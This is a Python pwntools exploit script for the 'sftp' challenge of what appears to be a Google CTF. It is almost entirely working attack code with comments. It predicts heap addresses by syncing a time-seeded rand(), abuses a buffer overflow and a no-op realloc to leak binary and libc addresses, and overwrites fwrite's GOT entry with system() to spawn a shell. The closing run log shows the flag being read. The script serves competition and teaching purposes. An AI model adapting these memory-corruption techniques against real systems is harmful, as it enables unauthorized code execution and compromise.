#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import ctypes
import os
import time

from pwn import *

context(arch='amd64', os='linux', terminal=['tmux', 'new-window'])

binary = ELF('./sftp')

if not args['REMOTE']:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    argv = [binary.path]
    envp = {'LD_PRELOAD': ' '.join([libc.path]), 'PWD': os.getcwd()}

    if args['GDB']:
        context(aslr=False)
        io = gdb.debug(
            args=argv,
            env=envp,
            gdbscript='''\
            set breakpoint pending on
            set follow-fork-mode parent

            add-symbol-file types.o 0

            continue
        ''')
    else:
        io = process(argv=argv, env=envp)

    binary.address = io.libs()[binary.path]
    libc.address = io.libs()[libc.path]
else:
    libc = ELF('./libc-amd64-2.23-0ubuntu10.so')
    io = remote('sftp.ctfcompetition.com', 1337)

# by @integeruser

# PoC not super reliable, it might be needed to re-execute it a few times to spawn a shell


def mkdir(path):
    io.sendlineafter('sftp> ', 'mkdir {}'.format(path))
    entry_addr = get_address_returned_by_malloc()
    return entry_addr


def cd(path):
    io.sendlineafter('sftp> ', 'cd {}'.format(path))


def ls():
    io.sendlineafter('sftp> ', 'ls')


def put(path, data):
    io.sendlineafter('sftp> ', 'put {}'.format(path))
    io.sendline(str(len(data)))
    io.send(data)
    entry_addr = get_address_returned_by_malloc()
    data_addr = get_address_returned_by_malloc()
    return entry_addr, data_addr


def get(path):
    io.sendlineafter('sftp> ', 'get {}'.format(path))


def create_dir_with_child_entry(entry_addr):
    # abusing the buffer overflow in `new_entry()` (sftp.c:333) and the fact that the custom
    # `realloc()` implementation does, in fact, nothing, we can create a directory for which
    # one of the child entries is an arbitrary pointer

    # to do this, we start by creating a directory whose 18th child points to our arbitrary address
    dir_name = 'A' * 20
    payload = fit({
        00: dir_name,  # entry.name
        20: 'BBBBBBBB',  # directory_entry.child count
        28: 'CCCCCCCC' * 17 + p64(entry_addr),  # directory_entry.child
    })
    _ = mkdir(payload)
    # after the directory creation, only the pointers to the first 16 children are memset to zero (sftp.c:401)

    # the entry of any newly created directory can store initially 0x10 child entries (sftp.c:400);
    # before the 17th child is added, the child array of pointers is reallocated (sftp.c:314)
    # and its size is doubled--but the custom implementation of `realloc()` does nothing,
    # allowing us to add the arbitrary 18th child

    # cd into the created directory
    dir_actual_name = '{}{}'.format(dir_name, chr(0x10))
    cd(dir_actual_name)
    # add 16 child entries
    for i in range(ord('A'), ord('A') + 16):
        _ = mkdir(chr(i))
    # adding the 17th entry triggers the "reallocation" (sftp.c:314)
    _ = mkdir('ZZZZ')
    # now the directory has 18 child entries, and the last is our arbitrary `entry_addr`


def leak_memory_at(addr):
    # by means of the vulnerabilities discussed in `create_dir_with_child_entry()`,
    # we can create a directory which has, among others, a child entry pointing to an arbitrary address

    # also, we can use the `ls` command to print the `entry.name` field (at offset 0xc)
    # of all the children of a directory

    # by combining the two, we can leak memory at any address
    create_dir_with_child_entry(addr - 0xc)
    # trigger the leak by printing names of child entries
    ls()
    # skip the output for the first 17 children
    for _ in range(17):
        io.recvline()
    # the printed "name" of the 18th child is our leaked memory
    # (since we use this vuln only to leak addresses, we know in advance that we will leak exactly 6 bytes)
    leak = u64(io.recvn(6).ljust(8, '\0'))
    return leak


# part 1: finding the base addresses of the binary and libc

# connect to the fictitious sftp server (the password was found using the attached script `find_password.py`)
io.sendlineafter('Are you sure you want to continue connecting (yes/no)? ', 'yes')
password = 'AHIPY'
io.sendlineafter('c01db33f@sftp.google.ctf\'s password:', password)
# the application is now displaying its main menu and waiting for our commands

# load the libc PRNG and initialize it in the same way done by the `sftp` binary (.text:0000555555554EAB)
libc_dll = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc_dll.srand(int(time.time()))

# now, we need to synchronize the state of this local PRNG with the state of the PRNG in the running application
# by executing `rand()` the same number of times


def get_address_returned_by_malloc():
    # the custom `malloc()` implementation used by the application
    return (libc_dll.rand() & 0x1fffffff) | 0x40000000


# before reaching the main menu, `rand()` is executed six times (found with `ltrace -e rand ./sftp`):
# the first time to allocate the directory entry named `c01db33f` (.text:0000555555554F0F),
# and the others five for similar (but uninteresting) stuff

# save the return value of the first `rand()`...
c01db33f_dir_entry_addr = get_address_returned_by_malloc()
success('c01db33f_dir_entry_addr: {}'.format(hex(c01db33f_dir_entry_addr)))
# ...and discard the others
for _ in range(5):
    _ = get_address_returned_by_malloc()

# (note that the parent directory of the `c01db33f` entry is the `home` entry,
# stored in the .data section at .bss:000055555575CBE0)

# the two PRNGs should now be in the same state (assuming we were fast enough to use the same seed for `srand()`)

# now, find the base address of the binary, through a leak of the address of the `home` entry
# (see `leak_memory_at()` for explanations)
# the address of the `home` entry can be found in the field `parent_directory` of the `c01db33f` entry,
# of which we know the address (see above)
c01db33f_dir_entry_parent_addr = c01db33f_dir_entry_addr
home_entry_addr = leak_memory_at(c01db33f_dir_entry_parent_addr)
home_entry_offset_from_base = 0x208be0
binary.address = home_entry_addr - home_entry_offset_from_base
success('binary.address: {}'.format(hex(binary.address)))

# since we know the base address of the binary, then we can find the base address of libc,
# through a leak of the address of `rand()` taken from the GOT
rand_addr = leak_memory_at(binary.symbols['got.rand'])
libc.address = rand_addr - (libc.symbols['rand'] - libc.address)
success('libc.address: {}'.format(hex(libc.address)))


# part 2: executing system('/bin/sh') by changing the entry of `fwrite()` in the GOT

# the idea is that if we are able to craft a fake `file_entry` structure, then
# we can use the `put` command for writing arbitrary data to arbitrary locations (sftp.c:566)

# 1) we can store a fake `file_entry` structure somewhere in memory using the `put` command
# 2) the address of this fake entry is known since we can predict the addresses returned by `malloc()`

# so, we build a fake file entry whose `data` pointer points to the `fwrite()` entry in the GOT
fake_file_entry_name = 'XYZ'
fake_file_entry = fit({
    0x08: p32(0x2),  # entry.type (FILE_ENTRY)
    0x0c: '{}\0'.format(fake_file_entry_name),  # entry.name
    0x28: p64(binary.symbols['got.fwrite'])  # file_entry.data
})
_, fake_file_entry_addr = put('abcd', fake_file_entry)

# we use the same vulnerability used before to set this fake entry as child of some directory
create_dir_with_child_entry(fake_file_entry_addr)
# now, we can use the `put` command on the fake file entry to write the address of `system()`
# in the GOT entry of `fwrite()`
put(fake_file_entry_name, p64(libc.symbols['system']))

# create a file with content '/bin/sh\0', and use the `get` command to trigger
# the execution of `fwrite('/bin/sh\0')` (now `system()`)
put('pwned', '/bin/sh\0')
get('pwned')

io.interactive()
# $ ./sftp.py REMOTE
# [*] '/home/vagrant/vbox/sftp/sftp'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     FORTIFY:  Enabled
# [*] '/lib/x86_64-linux-gnu/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to sftp.ctfcompetition.com on port 1337: Done
# [*] '/home/vagrant/vbox/sftp/libc-amd64-2.23-0ubuntu10.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] c01db33f_dir_entry_addr: 0x58a8f86b
# [+] binary.address: 0x55a22ab07000
# [+] libc.address: 0x7f720e7ab000
# [*] Switching to interactive mode
# 8
# $ cat /home/user/flag
# CTF{Moar_Randomz_Moar_Mitigatez!}
